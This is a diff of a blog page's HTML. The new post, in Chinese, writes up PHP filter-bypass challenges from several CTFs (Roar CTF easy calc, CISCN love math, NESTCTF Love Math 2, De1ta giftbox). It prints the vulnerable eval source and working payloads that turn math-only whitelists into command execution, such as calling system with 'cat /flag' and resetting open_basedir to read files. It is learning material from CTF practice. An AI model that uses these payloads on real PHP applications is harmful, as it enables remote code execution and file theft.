@@ -82,21 +82,22 @@
 
 
 
-<meta name="description" content="不会javascript, 在看smi1e师傅关于原型链污染攻击的博客时候, 这张图片让我思考了很久  很勉强的自己给自己找到一个比喻: cat.prototype是一个对象, 比作仓库, 仓库里面有按照一定顺序摆放的货物, constructor是在这些货物的基础上做的修改, 比如增加什么东西减去什么东西改变什么东西的顺序之类的. 没有constructor, 仓库就是静态的一个仓库, 也就是对">
+<meta name="description" content="Roar CTF easy calc https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/ 1234hexdec(bin2hex(&amp;apos;/&amp;apos;));?+num=scandir(hex2bin(dechex(47))) #解码出来的会自动带上引号hexdec(bin2hex(&amp;apos;">
 <meta name="keywords" content="CTF WEB">
 <meta property="og:type" content="article">
-<meta property="og:title" content="javascript-learn">
-<meta property="og:url" content="http://yoursite.com/2019/11/17/javascript-learn/index.html">
+<meta property="og:title" content="计算器和php语言动态特性">
+<meta property="og:url" content="http://yoursite.com/2020/01/14/php-calculator-and-dynamic-character/index.html">
 <meta property="og:site_name" content="CH4SER || 自闭室">
-<meta property="og:description" content="不会javascript, 在看smi1e师傅关于原型链污染攻击的博客时候, 这张图片让我思考了很久  很勉强的自己给自己找到一个比喻: cat.prototype是一个对象, 比作仓库, 仓库里面有按照一定顺序摆放的货物, constructor是在这些货物的基础上做的修改, 比如增加什么东西减去什么东西改变什么东西的顺序之类的. 没有constructor, 仓库就是静态的一个仓库, 也就是对">
+<meta property="og:description" content="Roar CTF easy calc https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/ 1234hexdec(bin2hex(&amp;apos;/&amp;apos;));?+num=scandir(hex2bin(dechex(47))) #解码出来的会自动带上引号hexdec(bin2hex(&amp;apos;">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/69004994-4e141d80-0956-11ea-8a97-a946b681ac75.png">
-<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/69007214-fc7b8b00-0975-11ea-9f53-bf96932750ea.png">
-<meta property="og:updated_time" content="2019-12-28T18:10:26.809Z">
+<meta property="og:image" content="http://yoursite.com/images/image-20200114164206598.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20200114173707940.png">
+<meta property="og:image" content="http://yoursite.com/images/70123884-86ce2980-16ae-11ea-83e0-367a142a00ad.png">
+<meta property="og:updated_time" content="2020-01-14T09:42:20.005Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="javascript-learn">
-<meta name="twitter:description" content="不会javascript, 在看smi1e师傅关于原型链污染攻击的博客时候, 这张图片让我思考了很久  很勉强的自己给自己找到一个比喻: cat.prototype是一个对象, 比作仓库, 仓库里面有按照一定顺序摆放的货物, constructor是在这些货物的基础上做的修改, 比如增加什么东西减去什么东西改变什么东西的顺序之类的. 没有constructor, 仓库就是静态的一个仓库, 也就是对">
-<meta name="twitter:image" content="https://user-images.githubusercontent.com/40637063/69004994-4e141d80-0956-11ea-8a97-a946b681ac75.png">
+<meta name="twitter:title" content="计算器和php语言动态特性">
+<meta name="twitter:description" content="Roar CTF easy calc https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/ 1234hexdec(bin2hex(&amp;apos;/&amp;apos;));?+num=scandir(hex2bin(dechex(47))) #解码出来的会自动带上引号hexdec(bin2hex(&amp;apos;">
+<meta name="twitter:image" content="http://yoursite.com/images/image-20200114164206598.png">
 
 
 
@@ -126,13 +127,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/11/17/javascript-learn/">
+  <link rel="canonical" href="http://yoursite.com/2020/01/14/php-calculator-and-dynamic-character/">
 
 
 
 
 
-  <title>javascript-learn | CH4SER || 自闭室</title>
+  <title>计算器和php语言动态特性 | CH4SER || 自闭室</title>
   
 
 
@@ -291,7 +292,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/17/javascript-learn/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/php-calculator-and-dynamic-character/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="ch4ser">
@@ -308,7 +309,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">javascript-learn</h1>
+          <h1 class="post-title" itemprop="name headline">计算器和php语言动态特性</h1>
         
 
         <div class="post-meta">
@@ -320,8 +321,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-11-17T16:15:38+08:00">
-                2019-11-17
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-01-14T16:16:05+08:00">
+                2020-01-14
               </time>
             
 
@@ -336,8 +337,8 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2019-12-29T02:10:26+08:00">
-                2019-12-29
+              <time title="Post modified" itemprop="dateModified" datetime="2020-01-14T17:42:20+08:00">
+                2020-01-14
               </time>
             
           </span>
@@ -364,7 +365,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  402
+                  930
                 </span>
               
 
@@ -380,7 +381,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  1
+                  5
                 </span>
               
             </div>
@@ -401,13 +402,35 @@
       
 
       
-        <p>不会javascript, 在看smi1e师傅关于原型链污染攻击的博客时候, 这张图片让我思考了很久</p>
-<p><img src="https://user-images.githubusercontent.com/40637063/69004994-4e141d80-0956-11ea-8a97-a946b681ac75.png" alt="image"></p>
-<p>很勉强的自己给自己找到一个比喻: cat.prototype是一个对象, 比作仓库, 仓库里面有按照一定顺序摆放的货物, constructor是在这些货物的基础上做的修改, 比如增加什么东西减去什么东西改变什么东西的顺序之类的. 没有constructor, 仓库就是静态的一个仓库, 也就是对象, 但是如果将constructor实施的话, 就是产生一个拥有新货物的仓库, 也就是cat实例对象, 那么类又是什么概念? 就像是给仓库定下一个整理计划, 这个计划叫做constructor, 而这个计划还没有实施, 你说他是静态的仓库(对象)似乎不妥, 因为有计划的存在, 这个仓库是可变的, 这个状态可以变化的仓库就叫做类.</p>
-<p>当然这种比喻很牵强, 我也不知道合不合理, 也只是为了更好理解原型链污染而做的臆想…</p>
-<p>然后对于p师傅博客中写道关于字典赋值proto无效的问题,实验了一下:</p>
-<p><img src="https://user-images.githubusercontent.com/40637063/69007214-fc7b8b00-0975-11ea-9f53-bf96932750ea.png" alt="image"></p>
-<p>字典在创立的时候应该是先创立字典内的项然后将他们聚合起来, 那么在创立a的时候先创立的是a的原型, 然后再创立的a, 这也就解释了为什么bar传不到Object中去,而是传入了Object的下一级, 也就是a的原型</p>
+        <h2 id="Roar-CTF-easy-calc">Roar CTF easy calc</h2>
+<p><a href="https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/" target="_blank" rel="noopener">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexdec(bin2hex(&apos;/&apos;));</span><br><span class="line">?+num=scandir(hex2bin(dechex(47))) #解码出来的会自动带上引号</span><br><span class="line">hexdec(bin2hex(&apos;/f1agg&apos;));</span><br><span class="line">?+num=file_get_contents(hex2bin(dechex(52115961636711)))</span><br></pre></td></tr></table></figure>
+<p>源码是这么执行语句的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">       $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">       <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">               <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                       <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">               &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br></pre></td></tr></table></figure>
+<h2 id="CISCN-2019-love-math">CISCN 2019 love math</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里<code>hex2bin</code>不在白名单中, 使用<code>base_convert</code>来构造<code>hex2bin</code>.利用<code>base_convert</code>的36进制构造出所需的字符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base_convert(37907361743,10,36)==&apos;hex2bin&apos;</span><br><span class="line"> hex2bin(dechex(1598506324))==&apos;_GET&apos;</span><br></pre></td></tr></table></figure>
+<p>那么</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_convert(37907361743,10,36)(dechex(1598506324))==&apos;_GET&apos;</span><br></pre></td></tr></table></figure>
+<p>调用参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?abs=cat%20/flag&amp;cos=system&amp;$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;cos&#125;($$pi&#123;abs&#125;)</span><br></pre></td></tr></table></figure>
+<h2 id="NESTCTF-2019-Love-Math-2">NESTCTF 2019 Love Math 2</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>,  <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span> , <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);</span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>长度限制非常严格, 考虑使用异或</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>,  <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span> , <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">$convert = [<span class="string">'decbin'</span>,<span class="string">'decoct'</span>];</span><br><span class="line"><span class="keyword">foreach</span>($whitelist <span class="keyword">as</span> $a)&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($convert <span class="keyword">as</span> $b)&#123;</span><br><span class="line">        <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">999999</span>;$i++)&#123;</span><br><span class="line">            $result = $a ^ $b($i);</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">'/_GET|_POST|_REQUEST/'</span>,$result))&#123;</span><br><span class="line">                <span class="keyword">echo</span> $a.<span class="string">"^"</span>.$b.<span class="string">"("</span>.$i.<span class="string">")="</span>.$result.<span class="string">"\n"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20200114164206598.png" alt="image-20200114164206598"></p>
+<p>然后构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=$pi=$&#123;hexdec^decoct(31737)&#125;;$pi&#123;abs&#125;($pi&#123;cos&#125;);</span><br></pre></td></tr></table></figure>
+<p>和上一题做一个对比看看</p>
+<p><img src="/images/image-20200114173707940.png" alt="image-20200114173707940"></p>
+<p>这就比较清楚了</p>
+<p>最后是对php动态特性的究极使用,</p>
+<h2 id="De1ta-ctf-2019-giftbox">De1ta ctf 2019 giftbox</h2>
+<p>打开后是一个漂亮的沙盒</p>
+<p><img src="/images/70123884-86ce2980-16ae-11ea-83e0-367a142a00ad.png" alt="image"></p>
+<p>掠过中间的部分, 最后使用动态特性来执行代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">targeting(&apos;a&apos;,&apos;chr&apos;)</span><br><span class="line">targeting(&apos;b&apos;,&apos;&#123;$a(46)&#125;&apos;)</span><br><span class="line">targeting(&apos;c&apos;,&apos;&#123;$b&#125;&#123;$b&#125;&apos;)</span><br><span class="line">targeting(&apos;d&apos;,&apos;&#123;$a(47)&#125;&apos;)</span><br><span class="line">targeting(&apos;e&apos;,&apos;js&apos;)</span><br><span class="line">targeting(&apos;f&apos;,&apos;open_basedir&apos;)</span><br><span class="line">targeting(&apos;g&apos;,&apos;chdir&apos;)</span><br><span class="line">targeting(&apos;h&apos;,&apos;ini_set&apos;)</span><br><span class="line">targeting(&apos;i&apos;,&apos;file_get_&apos;)</span><br><span class="line">targeting(&apos;j&apos;,&apos;&#123;$i&#125;contents&apos;)</span><br><span class="line">targeting(&apos;k&apos;,&apos;&#123;$g($e)&#125;&apos;)</span><br><span class="line">targeting(&apos;l&apos;,&apos;&#123;$h($f,$c)&#125;&apos;)</span><br><span class="line">targeting(&apos;m&apos;,&apos;&#123;$g($c)&#125;&apos;)</span><br><span class="line">targeting(&apos;n&apos;,&apos;&#123;$h($f,$d)&#125;&apos;)</span><br><span class="line">targeting(&apos;o&apos;,&apos;&#123;$d&#125;flag&apos;)</span><br><span class="line">targeting(&apos;p&apos;,&apos;&#123;$j($o)&#125;&apos;)</span><br><span class="line">targeting(&apos;q&apos;,&apos;printf&apos;)</span><br><span class="line">targeting(&apos;r&apos;,&apos;&#123;$q($p)&#125;&apos;)</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -432,8 +455,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/10/22/RoarCTFwp/" rel="next" title="RoarCTF复现">
-                <i class="fa fa-chevron-left"></i> RoarCTF复现
+              <a href="/2020/01/14/备忘录-xss/" rel="next" title="备忘录-xss">
+                <i class="fa fa-chevron-left"></i> 备忘录-xss
               </a>
             
           </div>
@@ -441,10 +464,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/12/16/vscode-vmware-xdebug/" rel="prev" title="使用vscode和xdebug实现远程调试虚拟机中的php项目">
-                使用vscode和xdebug实现远程调试虚拟机中的php项目 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -496,8 +515,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -514,7 +542,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">39</span>
+                  <span class="site-state-item-count">38</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -597,6 +625,22 @@
       </section>
 
       
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Roar-CTF-easy-calc"><span class="nav-number">1.</span> <span class="nav-text">Roar CTF easy calc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN-2019-love-math"><span class="nav-number">2.</span> <span class="nav-text">CISCN 2019 love math</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NESTCTF-2019-Love-Math-2"><span class="nav-number">3.</span> <span class="nav-text">NESTCTF 2019 Love Math 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#De1ta-ctf-2019-giftbox"><span class="nav-number">4.</span> <span class="nav-text">De1ta ctf 2019 giftbox</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
 
       
 
@@ -624,7 +668,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">67.8k</span>
+    <span title="Site words total count">68.7k</span>
   
 
   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
